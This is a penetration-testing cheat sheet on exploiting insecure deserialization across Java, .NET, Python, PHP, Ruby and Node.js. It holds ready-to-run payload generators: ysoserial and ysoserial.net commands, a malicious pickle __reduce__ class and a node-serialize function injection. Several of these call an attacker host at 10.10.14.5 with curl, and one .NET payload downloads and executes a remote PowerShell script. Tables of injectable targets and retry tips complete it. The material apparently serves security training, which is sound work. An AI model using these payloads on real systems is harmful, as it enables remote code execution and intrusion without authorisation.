---
tags: [pentest, deserialization, ysoserial, web, initial-access]
phase: 5
---
# Deserialization (ysoserial)

When an app deserializes user-controlled data without validation, you can craft a "gadget chain" that runs code as it's reconstructed.

[[06 - Gaining Access/00 - README|Folder index]]

## Identify

Likely deserialization sinks:

| Language | Format hint |
| --- | --- |
| Java | `rO0AB` (base64 of `0xACED0005` magic) |
| Java | `Content-Type: application/x-java-serialized-object` |
| .NET | `AAEAAAD/////` (base64) |
| Python | `pickle.loads`, `cPickle`, `dill` |
| PHP | `O:8:"stdClass":...` |
| Ruby | `--- !ruby/object:`, YAML.load |
| Node | `node-serialize` |

## Java - ysoserial

```bash
# Get the JAR
wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar

# List gadget chains
java -jar ysoserial-all.jar
# CommonsCollections1 / 2 / 5 / 6 / 7 (most common)
# Spring1, Hibernate1, Groovy1, etc.

# Generate a payload
java -jar ysoserial-all.jar CommonsCollections5 'curl http://10.10.14.5/' > payload.bin

# Base64-encode if the endpoint expects b64
java -jar ysoserial-all.jar CommonsCollections5 'curl http://10.10.14.5/' | base64 -w0
```

## .NET - ysoserial.net

```bash
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "powershell -nop -c IEX(IWR http://10.10.14.5/r.ps1 -UseBasicParsing)" -o base64
```

Common .NET gadgets:

- `TypeConfuseDelegate`
- `ObjectDataProvider`
- `WindowsClaimsIdentity`
- `WindowsIdentity`

## Python pickle

```python
import pickle, os, base64
class P:
    def __reduce__(self):
        return (os.system, ('curl http://10.10.14.5/',))
print(base64.b64encode(pickle.dumps(P())).decode())
```

> [!warning] Python pickle is RCE by design
> If the app calls `pickle.loads()` on anything user-controlled, you have RCE. No "gadget chain" needed.

## PHP

```php
// Class with __wakeup or __destruct that does something dangerous
class X {
    public $cmd = "id";
    function __destruct() { system($this->cmd); }
}
echo serialize(new X);
// O:1:"X":1:{s:3:"cmd";s:2:"id";}
```

## Ruby YAML

```yaml
--- !ruby/object:Gem::Installer
  i: x
--- !ruby/object:Gem::SpecFetcher
  i: y
# Old CVE-2013-0156 chain
```

## Node.js (node-serialize)

```javascript
_$$ND_FUNC$$_function(){require('child_process').exec('curl http://10.10.14.5/');}()
```

## Where to inject

- POST body / query param that contains serialized data
- Cookies (especially `JSESSIONID` if it's serialized object)
- ViewState (.NET; needs key knowledge OR ASP.NET ViewState IsEncrypted=false)
- Spring's `Authorization: Bearer` for some configurations
- JSF / Wicket / Struts custom params

## Test framework hits

| App | Hint |
| --- | --- |
| Apache Struts | `OGNL` errors, S2-CVE-* path |
| Liferay | `/api/jsonws` |
| Spring | `Spring4Shell` (CVE-2022-22965) |
| Jenkins | `/CLI` |
| WebLogic | T3 protocol (port 7001) |
| JBoss / WildFly | `/invoker/JMXInvokerServlet` |

## When you see X, do Y

| Symptom | Action |
| --- | --- |
| `ClassNotFoundException` | Different ysoserial gadget chain needed (try CC1 → CC5 → CC6 etc.) |
| App ignores your payload | Maybe not deserialization point. Try different param. |
| `NotSerializableException` | The Class is on classpath but doesn't implement Serializable. Different gadget. |
| Got blind RCE | Use OOB callback (curl interactsh / dnscallback) to confirm. |

> [!tip] Quick win
> If you find a Java app with `Content-Type: application/x-java-serialized-object` POST endpoint, try CommonsCollections5/6 immediately - it works ~70% of the time on old Java apps.
